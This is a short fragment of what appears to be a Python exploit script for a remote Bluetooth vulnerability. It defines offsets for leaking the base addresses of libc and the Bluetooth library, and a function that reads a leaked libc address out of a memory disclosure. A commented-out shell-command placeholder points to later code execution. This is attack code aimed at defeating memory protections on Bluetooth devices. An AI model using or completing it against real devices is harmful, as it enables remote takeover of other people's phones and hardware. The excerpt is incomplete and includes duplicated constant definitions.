...
#SHELL_SCRIPT = 'ping 192.168.1.18'

LEAK_LIB_BLUETOOTH_OFFSET = 0x60
LEAK_LIB_LIBC_OFFSET =0x130

OFFSET_LIBC_LEAK_WITH_BASE = 0x12000
OFFSET_LIBC_LEAK_WITH_BASE = 0x8000
OFFSET_BLUETOOTH_LEAK_WITH_BASE = 0xf4000
OFFSET_BLUETOOTH_LEAK_WITH_BASE = 0xfb000
...
def memory_leak_get_bases(src_hci, dst):
    ...
    libc_leak_address = struct.unpack(">I", leak[libc_stack_offset:libc_stack_offset+4])[0]
